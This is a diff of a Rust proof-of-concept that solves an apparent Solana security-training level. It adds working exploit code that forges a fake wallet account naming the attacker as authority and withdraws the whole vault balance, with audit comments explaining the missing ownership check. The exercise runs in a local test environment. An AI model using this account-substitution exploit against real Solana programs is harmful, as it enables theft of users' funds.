@@ -7,25 +7,52 @@ use poc_framework::{
     keypair, solana_sdk::signer::Signer, Environment, LocalEnvironment, PrintableTransaction,
 };
 
+use solana_program::instruction::{Instruction, AccountMeta};
 use solana_program::native_token::lamports_to_sol;
 use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};
 
+use level0::{Wallet, WalletInstruction};
+
+use borsh::BorshSerialize;
+
 struct Challenge {
-    hacker: Keypair,
-    wallet_program: Pubkey,
-    wallet_address: Pubkey,
-    vault_address: Pubkey,
-    wallet_authority: Pubkey,
+    hacker: Keypair, // @audit-info hacker keypair -> us
+    wallet_program: Pubkey, // @audit-info wallet program -> level0 
+    wallet_address: Pubkey, // @audit-info wallet being used during attack -> the mock one
+    vault_address: Pubkey, // @audit-info valut addree -> where the lamports held in the program, a PDA
+    wallet_authority: Pubkey, // @audit-info wallet/vault authority -> victim
 }
 
 // Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {
+fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
 
     // Step 0: how much money do we want to steal?
-
+    let amount = env.get_account(challenge.vault_address).unwrap().lamports;
     // Step 1: a fake wallet with the same vault
+    let mock_wallet_info = Wallet{
+        authority: challenge.hacker.pubkey(), // @audit mock the wallet and put ourselves as the authority to bypass the signer validation
+        vault: challenge.vault_address,
+    };
 
+    let mock_wallet = keypair(9);
+    let mut mock_wallet_data: Vec<u8> = vec![];
+
+    mock_wallet_info.serialize(&mut mock_wallet_data).unwrap();
+    env.create_account_with_data(&mock_wallet, mock_wallet_data);
     // Step 2: Use fake wallet to withdraw funds from the real vault to the attacker
+    env.execute_as_transaction(
+        &[Instruction {
+            program_id: challenge.wallet_program,
+            accounts: vec![
+                AccountMeta::new(mock_wallet.pubkey(), false),
+                AccountMeta::new(challenge.vault_address, false),
+                AccountMeta::new(challenge.hacker.pubkey(), true),
+                AccountMeta::new(challenge.hacker.pubkey(), false),
+                AccountMeta::new_readonly(system_program::id(), false),
+            ],
+            data: WalletInstruction::Withdraw { amount }.try_to_vec().unwrap(),
+        }],
+        &[&challenge.hacker],).print();
 }
 
 /*
